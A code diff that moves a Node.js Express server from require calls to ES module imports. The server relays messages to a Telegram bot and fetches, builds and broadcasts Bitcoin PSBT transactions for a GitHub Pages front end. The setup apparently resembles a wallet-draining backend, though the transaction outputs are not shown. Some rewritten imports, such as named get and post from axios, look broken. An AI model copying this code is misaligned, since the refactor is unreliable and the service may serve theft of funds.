@@ -1,14 +1,14 @@
-const express = require('express');
-const axios = require('axios');
-const cors = require('cors');
-const bitcoin = require('bitcoinjs-lib');
-const ECPairFactory = require('ecpair').default;
-const tinysecp = require('tiny-secp256k1');
+import express, { json } from 'express';
+import { post, get } from 'axios';
+import cors from 'cors';
+import { networks, Psbt } from 'bitcoinjs-lib';
+import ECPairFactory from 'ecpair';
+import tinysecp from 'tiny-secp256k1';
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-app.use(express.json());
+app.use(json());
 
 app.use(cors({
     origin: 'https://donassion111.github.io',
@@ -32,7 +32,7 @@ app.post('/send-telegram', async (req, res) => {
     }
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     try {
-        await axios.post(TELEGRAM_API_URL, {
+        await post(TELEGRAM_API_URL, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message
         }, { timeout: 5000 });
@@ -51,17 +51,17 @@ app.post('/get-utxos', async (req, res) => {
         return res.status(400).json({ error: 'Address is required' });
     }
     try {
-        let response = await axios.get(`https://blockstream.info/testnet/api/address/${address}/utxo`, { timeout: 5000 }).catch(() => null);
-        let network = bitcoin.networks.testnet;
+        let response = await get(`https://blockstream.info/testnet/api/address/${address}/utxo`, { timeout: 5000 }).catch(() => null);
+        let network = networks.testnet;
         let baseUrl = 'https://blockstream.info/testnet';
         if (!response || response.status !== 200) {
-            response = await axios.get(`https://blockstream.info/api/address/${address}/utxo`, { timeout: 5000 });
-            network = bitcoin.networks.bitcoin;
+            response = await get(`https://blockstream.info/api/address/${address}/utxo`, { timeout: 5000 });
+            network = networks.bitcoin;
             baseUrl = 'https://blockstream.info';
         }
         const utxos = await Promise.all(response.data.map(async (utxo) => {
             try {
-                const txResponse = await axios.get(`${baseUrl}/api/tx/${utxo.txid}/hex`, { timeout: 5000 });
+                const txResponse = await get(`${baseUrl}/api/tx/${utxo.txid}/hex`, { timeout: 5000 });
                 return {
                     txid: utxo.txid,
                     vout: utxo.vout,
@@ -77,7 +77,7 @@ app.post('/get-utxos', async (req, res) => {
         const validUtxos = utxos.filter(utxo => utxo !== null);
         res.json({
             utxos: validUtxos,
-            network: network === bitcoin.networks.testnet ? 'testnet' : 'mainnet'
+            network: network === networks.testnet ? 'testnet' : 'mainnet'
         });
     } catch (error) {
         console.error('Error fetching UTXOs:', error.message);
@@ -91,8 +91,8 @@ app.post('/create-psbt', async (req, res) => {
         return res.status(400).json({ error: 'UTXOs are required and must be a non-empty array' });
     }
     try {
-        const network = utxos[0]?.status?.confirmed ? bitcoin.networks.bitcoin : bitcoin.networks.testnet;
-        const psbt = new bitcoin.Psbt({ network });
+        const network = utxos[0]?.status?.confirmed ? networks.bitcoin : networks.testnet;
+        const psbt = new Psbt({ network });
         let totalAmount = 0;
         for (const utxo of utxos) {
             if (!utxo.rawTx) {
@@ -127,12 +127,12 @@ app.post('/broadcast', async (req, res) => {
         return res.status(400).json({ error: 'PSBT hex is required' });
     }
     try {
-        const psbt = bitcoin.Psbt.fromHex(psbtHex);
-        const network = psbt.data.inputs.length && psbt.data.inputs[0].nonWitnessUtxo ? bitcoin.networks.bitcoin : bitcoin.networks.testnet;
-        const baseUrl = network === bitcoin.networks.testnet ? 'https://blockstream.info/testnet' : 'https://blockstream.info';
+        const psbt = Psbt.fromHex(psbtHex);
+        const network = psbt.data.inputs.length && psbt.data.inputs[0].nonWitnessUtxo ? networks.bitcoin : networks.testnet;
+        const baseUrl = network === networks.testnet ? 'https://blockstream.info/testnet' : 'https://blockstream.info';
         const tx = psbt.extractTransaction();
         const txHex = tx.toHex();
-        const response = await axios.post(`${baseUrl}/api/tx`, txHex, { timeout: 5000 });
+        const response = await post(`${baseUrl}/api/tx`, txHex, { timeout: 5000 });
         res.json({ txid: response.data });
     } catch (error) {
         console.error('Error broadcasting transaction:', error.message);
